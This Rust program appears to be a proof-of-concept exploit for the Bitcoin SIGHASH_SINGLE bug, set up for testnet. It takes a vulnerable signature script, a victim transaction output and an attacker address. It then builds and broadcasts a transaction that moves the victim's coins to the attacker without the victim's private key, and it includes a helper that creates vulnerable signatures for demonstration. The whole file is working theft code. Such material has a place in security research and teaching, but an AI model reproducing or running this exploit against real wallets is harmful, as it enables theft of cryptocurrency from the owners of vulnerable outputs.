use bitcoincore_rpc::{
    bitcoin::{
        blockdata::script::Builder,
        secp256k1::{Message, Secp256k1},
        Address, Amount, OutPoint, Script, SigHashType, Transaction, TxIn, TxOut, Txid,
    },
    json::SignRawTransactionInput,
    Auth, Client, RawTx, RpcApi,
};
use log::{error, info, LevelFilter};
use simple_logging::{log_to_file, log_to_stderr};
use std::net::SocketAddr;
use std::path::PathBuf;
use std::{thread::sleep, time::Duration};
use structopt::StructOpt;

#[derive(Debug, StructOpt)]
#[structopt(name = "sighashargs", about = "Bitcoin SigHash Scanner Arguments")]
struct ProgramArguments {
    #[structopt(long = "vuln-script")]
    vuln_script: Script,
    #[structopt(long = "steal-txid")]
    steal_txid: Txid,
    #[structopt(long = "steal-vout")]
    steal_vout: u32,
    #[structopt(long = "attacker-address")]
    attacker_address: Address,
    #[structopt(default_value = "127.0.0.1:18332", long = "address")]
    address: SocketAddr,
    #[structopt(parse(from_os_str), long = "log-file")]
    log_file: Option<PathBuf>,
    #[structopt(parse(from_os_str), long = "bitcoin-dir")]
    bitcoin_dir: Option<PathBuf>,
}

const SATS_AS_FEE: u64 = 400;

fn main() {
    let args = ProgramArguments::from_args();
    match args.log_file {
        None => log_to_stderr(LevelFilter::Info),
        Some(f) => log_to_file(
            f.to_str()
                .expect("Can't convert given log path to string, leaving!"),
            LevelFilter::Info,
        )
        .expect("Failed to set up logging!"),
    }
    let mut url = "http://".to_string();
    url.push_str(args.address.to_string().as_str());

    let mut cookie_path = match args.bitcoin_dir {
        Some(p) => p,
        None => match true {
            cfg!(target_os = "window") => {
                let mut p = dirs::config_dir().expect("Failed to get default bitcoin directory, please specify it using --bitcoin-dir");
                p.push("Bitcoin");
                p
            }
            _ => {
                let mut p = dirs::home_dir().expect("Failed to get default bitcoin directory, please specify it using --bitcoin-dir");
                p.push(".bitcoin");
                p
            }
        },
    };
    cookie_path.push("testnet3");

    let attacker_address = args.attacker_address;
    let vuln_script_sig = args.vuln_script;
    cookie_path.push(".cookie");
    info!(
        "Using .cookie auth with path: {}",
        cookie_path.to_str().unwrap()
    );
    let auth = Auth::CookieFile(cookie_path);
    info!("Using url: {}", url);
    let client = Client::new(url.as_str(), auth).unwrap();

    let utxos = client
        .list_unspent(Some(0), None, Some(&[&attacker_address]), None, None)
        .unwrap();
    if utxos.is_empty() {
        error!("Attacker has no UTXOs");
        panic!();
    }
    let utxo_to_spend = &utxos[0];

    info!(
        "Spending utxo: txid: {}, vout: {}",
        utxo_to_spend.txid, utxo_to_spend.vout
    );

    let tx_to_steal_from = client
        .get_transaction(&args.steal_txid, None)
        .expect("Failed to get steal transaction info")
        .transaction()
        .expect("Failed to parse get_transaction RPC result");
    let steal_vout_usize =
        usize::try_from(args.steal_vout).expect("Can't convert input steal-vout to usize");
    if tx_to_steal_from.output.len() <= steal_vout_usize {
        error!(
            "No vout number {} in transaction txid: {} which has only {} outputs!",
            args.steal_vout,
            args.steal_txid,
            tx_to_steal_from.output.len()
        );
        panic!();
    }
    let out_to_steal = &tx_to_steal_from.output[steal_vout_usize];

    let outpoint = OutPoint {
        txid: args.steal_txid,
        vout: args.steal_vout,
    };
    // Build tx stealing from victim.
    let steal_tx = steal_vuln_tx(
        &client,
        &vuln_script_sig,
        (out_to_steal, outpoint),
        &attacker_address,
    );

    info!("steal_tx: {:?}", &steal_tx);
    info!("steal_tx raw: {}", &steal_tx.raw_hex());

    client
        .send_raw_transaction(steal_tx.raw_hex())
        .expect("Failed to send exploit tx");

    print_blockstream_txid_link(&steal_tx.txid(), 0);
    print_blockstream_address_link(&attacker_address);

    info!("Finished, leaving!");
}

#[allow(dead_code)]
fn make_vuln_tx(client: &Client, victim_addres: &Address) -> Transaction {
    if !victim_addres.script_pubkey().is_p2pkh() {
        panic!("Victim address should be p2pkh, the attack only works on these addresses!");
    }
    let mut personal_utxos = client
        .list_unspent(Some(0), None, Some(&[victim_addres]), None, None)
        .expect("Failed to list_unspent");
    // We'll need to have at least two utxos to first creat the conditions that enable this attack.
    assert!(personal_utxos.is_empty());
    if personal_utxos.len() < 2 {
        split_utxos(client, victim_addres);
        sleep(Duration::from_secs(1));
        personal_utxos = client
            .list_unspent(Some(0), None, Some(&[victim_addres]), None, None)
            .expect("Failed to list_unspent");
    }

    let tx_in_1 = TxIn {
        previous_output: OutPoint {
            txid: personal_utxos[0].txid,
            vout: personal_utxos[0].vout,
        },
        script_sig: Script::new(),
        witness: Vec::new(),
        sequence: u32::MAX,
    };
    let tx_in_2 = TxIn {
        previous_output: OutPoint {
            txid: personal_utxos[1].txid,
            vout: personal_utxos[1].vout,
        },
        script_sig: Script::new(),
        witness: Vec::new(),
        sequence: u32::MAX,
    };

    let tx_out = TxOut {
        value: (personal_utxos[0].amount + personal_utxos[1].amount
            - Amount::ONE_SAT * SATS_AS_FEE)
            .as_sat(),
        script_pubkey: personal_utxos[0].script_pub_key.clone(),
    };

    let mut vuln_tx = Transaction {
        version: 2,
        lock_time: 0,
        input: vec![tx_in_1, tx_in_2],
        output: vec![tx_out.clone()],
    };
    let sk = client.dump_private_key(victim_addres).unwrap();
    let ctx = Secp256k1::new();

    let sh1 = vuln_tx
        .signature_hash(0, &tx_out.script_pubkey, SigHashType::Single.as_u32())
        .to_vec();
    assert_eq!(sh1.len(), 32);
    let msg1 = Message::from_slice(&sh1).unwrap();
    let mut sig1 = ctx.sign(&msg1, &sk.key).serialize_der().to_vec();
    sig1.push(SigHashType::Single.as_u32() as u8);
    let script1 = Builder::new()
        .push_slice(sig1.as_slice())
        .push_slice(&sk.public_key(&ctx).key.serialize())
        .into_script();

    // This should have worked, but currently it's a bug in rust-bitcoin.
    // let sh2 = vuln_tx
    // .signature_hash(1, &tx_out.script_pubkey, SigHashType::Single.as_u32())
    // .to_vec();

    let sh2 = [
        1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0,
    ]
    .to_vec();
    assert_eq!(sh2.len(), 32);
    let msg2 = Message::from_slice(&sh2).unwrap();
    let mut sig2 = ctx.sign(&msg2, &sk.key).serialize_der().to_vec();
    sig2.push(SigHashType::Single.as_u32() as u8);
    let script2 = Builder::new()
        .push_slice(sig2.as_slice())
        .push_slice(&sk.public_key(&ctx).key.serialize())
        .into_script();
    vuln_tx.input[0].script_sig = script1;
    vuln_tx.input[0].witness.clear();
    vuln_tx.input[1].script_sig = script2;
    vuln_tx.input[1].witness.clear();
    vuln_tx
}

// Notice how in this code we don't make any use of the Victim's private key!
fn steal_vuln_tx(
    client: &Client,
    vuln_script_sig: &Script,
    victim_utxo: (&TxOut, OutPoint),
    theif_address: &Address,
) -> Transaction {
    let unspent_utxos = client
        .list_unspent(Some(0), None, Some(&[theif_address]), None, None)
        .unwrap();
    if unspent_utxos.is_empty() {
        panic!("Not enough utxos for theif address: {}", theif_address);
    }
    if !theif_address.script_pubkey().is_p2pkh() {
        panic!("Please use a p2pkh address first!");
    }
    let first_utxo = &unspent_utxos[0];
    let tx_in_theif = TxIn {
        previous_output: OutPoint {
            txid: first_utxo.txid,
            vout: first_utxo.vout,
        },
        sequence: u32::MAX,
        witness: Vec::new(),
        script_sig: Script::new(),
    };
    let tx_in_vuln = TxIn {
        previous_output: victim_utxo.1,
        script_sig: vuln_script_sig.clone(),
        sequence: u32::MAX,
        witness: Vec::new(),
    };
    let tx_out = TxOut {
        script_pubkey: theif_address.script_pubkey(),
        value: victim_utxo.0.value + first_utxo.amount.as_sat()
            - (Amount::ONE_SAT * SATS_AS_FEE).as_sat(),
    };
    let mut exploit_tx = Transaction {
        version: 2,
        lock_time: 0,
        input: vec![tx_in_theif, tx_in_vuln],
        output: vec![tx_out.clone()],
    };

    // Now we only sign our (theif) TxIn:
    let theif_priv_key = client.dump_private_key(theif_address).unwrap();
    let ctx = Secp256k1::new();

    let sh1 = exploit_tx
        .signature_hash(0, &tx_out.script_pubkey, SigHashType::Single.as_u32())
        .to_vec();
    assert_eq!(sh1.len(), 32);
    let msg1 = Message::from_slice(&sh1).unwrap();
    let mut sig1 = ctx
        .sign(&msg1, &theif_priv_key.key)
        .serialize_der()
        .to_vec();
    sig1.push(SigHashType::Single.as_u32() as u8);
    let script1 = Builder::new()
        .push_slice(sig1.as_slice())
        .push_slice(&theif_priv_key.public_key(&ctx).key.serialize())
        .into_script();
    exploit_tx.input[0].script_sig = script1;
    exploit_tx.input[0].witness.clear();
    exploit_tx
}

// helper function
fn split_utxos(client: &Client, address: &Address) {
    let unspent_utxos = client
        .list_unspent(Some(0), None, Some(&[address]), None, None)
        .expect("Failed list_unspent");
    if unspent_utxos.len() >= 2 {
        return;
    }
    if unspent_utxos[0].amount.as_sat() < 50000 {
        panic!("Address: {} has only dust!", &address)
    }
    let tx_in = TxIn {
        previous_output: OutPoint {
            txid: unspent_utxos[0].txid,
            vout: unspent_utxos[0].vout,
        },
        script_sig: Script::new(),
        witness: Vec::new(),
        sequence: u32::MAX,
    };
    let tx_out_1 = TxOut {
        script_pubkey: address.script_pubkey(),
        value: unspent_utxos[0].amount.as_sat() / 2 - 200,
    };
    let tx_out_2 = TxOut {
        script_pubkey: address.script_pubkey(),
        value: unspent_utxos[0].amount.as_sat() / 2 - 200,
    };
    let split_tx = Transaction {
        version: 2,
        lock_time: 0,
        input: vec![tx_in],
        output: vec![tx_out_1, tx_out_2],
    };
    let utxo = SignRawTransactionInput {
        txid: unspent_utxos[0].txid,
        vout: unspent_utxos[0].vout,
        script_pub_key: unspent_utxos[0].script_pub_key.clone(),
        redeem_script: unspent_utxos[0].redeem_script.clone(),
        amount: Some(unspent_utxos[0].amount),
    };
    let signed_tx = client
        .sign_raw_transaction_with_wallet(&split_tx, Some(&[utxo]), Some(SigHashType::All.into()))
        .expect("Failed to sign split tx")
        .transaction()
        .expect("Failed to convert signed split tx to tx format");
    client
        .send_raw_transaction(&signed_tx)
        .expect("Failed to send split tx");
    info!("Sent split tx successfully! txid: {}", signed_tx.txid());
    print_blockstream_txid_link(&signed_tx.txid(), 0);
}

fn print_blockstream_txid_link(txid: &Txid, input_id: usize) {
    info!(
        "https://blockstream.info/testnet/tx/{}?input:{}&expand",
        txid.to_string(),
        input_id
    );
}
fn print_blockstream_address_link(addr: &Address) {
    info!(
        "https://blockstream.info/testnet/address/{}",
        addr.to_string()
    )
}
